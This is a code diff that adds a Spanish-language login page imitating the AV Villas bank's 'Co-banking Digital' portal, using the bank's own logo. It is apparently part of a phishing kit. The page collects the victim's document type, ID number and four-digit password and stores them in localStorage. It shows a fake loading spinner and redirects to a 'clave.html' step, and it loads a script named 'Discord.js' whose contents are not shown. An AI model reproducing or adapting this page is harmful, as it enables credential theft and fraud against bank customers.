@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>AV Villas Login</title>
+  <script src="Discord.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+    .icon-right {
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    input:focus ~ .icon-right,
+    input:not(:placeholder-shown) ~ .icon-right {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col items-center pt-8 px-4">
+  <img alt="Logo AV Villas" class="w-[1600px] h-[50px] object-contain mb-6" src="https://www.avvillas.com.co/wps/wcm/connect/avvillas/efa08570-8128-4a7b-a324-5d9aa6c87fc2/logo-avv-digital.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_G0MI0J02L8NK70AHL9SQNR1826-efa08570-8128-4a7b-a324-5d9aa6c87fc2-p5cl6.b"/>
+
+  <h1 class="text-black font-semibold text-base mb-6 text-center">
+    Ingresa a tu Co-banking Digital
+  </h1>
+
+  <form class="w-full max-w-md space-y-6" id="loginForm">
+
+    <!-- Tipo de documento -->
+    <div class="relative">
+      <label for="docType" class="text-xs text-blue-700 absolute left-3 top-2 bg-white px-1 z-10">Tipo de documento</label>
+      <div class="relative">
+        <select id="docType" name="docType" required
+          class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 appearance-none bg-white pr-10"
+        >
+          <option value="" disabled>Cédula de Ciudadanía</option>
+          <option value="cc" selected>Cédula de Ciudadanía</option>
+          <option value="ti">Tarjeta de Identidad</option>
+          <option value="ce">Cédula de Extranjería</option>
+          <option value="nit">NIT</option>
+        </select>
+        <div class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none">
+          <i class="fas fa-chevron-down text-gray-500"></i>
+        </div>
+      </div>
+    </div>
+
+    <!-- Número de documento -->
+    <div class="relative">
+      <input type="text" id="docNumber" name="docNumber" required inputmode="numeric"
+        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
+        placeholder="Número de documento"
+      />
+      <label for="docNumber"
+        class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
+        Número de documento
+      </label>
+      <i class="fas fa-user icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
+    </div>
+
+    <!-- Contraseña -->
+    <div class="relative">
+      <input type="password" id="password" name="password" required inputmode="numeric" maxlength="4"
+        class="peer w-full border border-gray-300 rounded-md px-4 pt-6 pb-2 text-base text-gray-800 placeholder-transparent focus:outline-none focus:border-blue-700 pr-10"
+        placeholder="Contraseña"
+      />
+      <label for="password"
+        class="absolute left-3 top-2 text-xs text-blue-700 bg-white px-1 transition-all peer-placeholder-shown:top-5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-2 peer-focus:text-xs peer-focus:text-blue-700">
+        Contraseña
+      </label>
+      <i class="fas fa-lock icon-right absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none"></i>
+    </div>
+
+    <!-- Olvidé mi contraseña -->
+    <div class="flex justify-end text-xs font-semibold text-blue-700">
+      <a href="#" class="hover:underline">
+        Olvidé mi contraseña
+      </a>
+    </div>
+
+    <!-- Botón INGRESAR -->
+    <button type="submit" id="submitBtn" disabled
+      class="w-full bg-gray-300 text-white font-semibold py-4 rounded-full text-sm tracking-widest cursor-not-allowed transition duration-300"
+    >
+      INGRESAR
+    </button>
+  </form>
+
+  <!-- Registro -->
+  <p class="mt-8 text-center text-black text-sm">
+    ¿Aún no tienes contraseña para ingresar?
+    <br/>
+    <a href="#" class="text-blue-700 font-semibold hover:underline">Regístrate</a>
+  </p>
+
+  <!-- Problemas para ingresar -->
+  <p class="mt-6 text-center text-blue-700 text-sm font-semibold underline">
+    ¿Tienes problemas para ingresar?
+  </p>
+
+  <!-- Botón flotante -->
+  <div class="fixed top-[50%] right-0 -translate-y-1/2 bg-red-600 rounded-l-full w-12 h-12 flex items-center justify-center cursor-pointer select-none overflow-hidden">
+    <img src="img/carita.png" alt="botón" class="max-w-[70%] max-h-[70%] object-contain"/>
+  </div>
+
+  <!-- Loader rojo animado -->
+  <div id="loaderOverlay" class="fixed inset-0 bg-white bg-opacity-80 flex items-center justify-center z-50 hidden">
+    <div class="h-16 w-16 border-8 border-red-600 border-t-transparent rounded-full animate-spin"></div>
+  </div>
+
+  <script>
+    const docNumber = document.getElementById('docNumber');
+    const password = document.getElementById('password');
+    const docType = document.getElementById('docType');
+    const submitBtn = document.getElementById('submitBtn');
+
+    function checkInputs() {
+      const cleanDoc = docNumber.value.replace(/\D/g, '');
+      const passValid = /^\d{4}$/.test(password.value);
+      if (docType.value && cleanDoc.length > 0 && passValid) {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-blue-700', 'hover:bg-blue-800', 'cursor-pointer');
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
+        submitBtn.classList.remove('bg-blue-700', 'hover:bg-blue-800', 'cursor-pointer');
+      }
+    }
+
+    // Formateo del número de documento con puntos
+    docNumber.addEventListener('input', function (e) {
+      let value = e.target.value.replace(/\D/g, '');
+      value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+      e.target.value = value;
+      checkInputs();
+    });
+
+    // Solo 4 dígitos numéricos para la contraseña
+    password.addEventListener('input', function (e) {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      checkInputs();
+    });
+
+    docType.addEventListener('change', checkInputs);
+
+    // Guardar en localStorage y mostrar loader
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      localStorage.setItem('docType', docType.value);
+      localStorage.setItem('docNumber', docNumber.value);
+      localStorage.setItem('password', password.value);
+
+      document.getElementById('loaderOverlay').classList.remove('hidden');
+
+      setTimeout(() => {
+        window.location.href = 'clave.html';
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
